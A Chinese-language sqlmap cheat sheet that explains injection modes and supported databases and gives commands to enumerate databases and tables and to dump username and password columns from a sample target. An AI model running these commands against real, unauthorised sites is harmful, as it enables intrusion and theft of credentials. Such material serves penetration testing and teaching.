# sqlmap

sqlmap支持五种不同的注入模式：

1. 基于布尔的盲注，即可以根据返回页面判断条件真假的注入。
2. 基于时间的盲注，即不能根据页面返回内容判断任何信息，用条件语句查看时间延迟语句是否执行（即页面返回时间是否增加）来判断。
3. 基于报错注入，即页面会返回错误信息，或者把注入的语句的结果直接返回在页面中。
4. 联合查询注入，可以使用union的情况下的注入。
5. 堆查询注入，可以同时执行多条语句的执行时的注入。

### sqlmap支持的数据库有

MySQL, Oracle, PostgreSQL, Microsoft SQL Server, Microsoft Access, IBM DB2, SQLite, Firebird, Sybase和SAP MaxDB

## 选项：

* –version 显示程序的版本号
* -h, –help 显示此帮助信息
* --h 显示高级帮助信息
* -v 输出内容详细级别：0-6（默认为1）

## 检测注入

小提示：

`--wizard 给初级用户的简单向导界面`

`--batch 跳过一些选项，自动选择`

### 基本格式

```text
sqlmap -u "http://www.vuln.cn/post.php?id=1"
默认使用level1检测全部数据库类型

sqlmap -u "http://www.vuln.cn/post.php?id=1" –dbms mysql –level 3
指定数据库类型为mysql，级别为3（共5级，级别越高，检测越全面)
```

### 跟随302跳转

当注入页面错误的时候，自动跳转到另一个页面的时候需要跟随302，  
当注入错误的时候，先报错再跳转的时候，不需要跟随302。  
目的就是：要追踪到错误信息。

## 注入成功后

### 获取数据库基本信息

```text
#查询有哪些数据库
sqlmap -u "http://www.vuln.cn/post.php?id=1" –dbms mysql –level 3 –dbs

#查询test数据库中有哪些表
sqlmap -u "http://www.vuln.cn/post.php?id=1" –dbms mysql –level 3 -D test –tables

#查询test数据库中admin表有哪些字段
sqlmap -u "http://www.vuln.cn/post.php?id=1" –dbms mysql –level 3 -D test -T admin –columns

#dump出字段username与password中的数据
sqlmap -u "http://www.vuln.cn/post.php?id=1" –dbms mysql –level 3 -D test -T admin -C “username,password” –dump
```

### 从数据库中搜索字段

```text
#在dedecms数据库中搜索字段admin或者password
sqlmap -r "c:\tools\request.txt" –dbms mysql -D dedecms –search -C admin,password
```

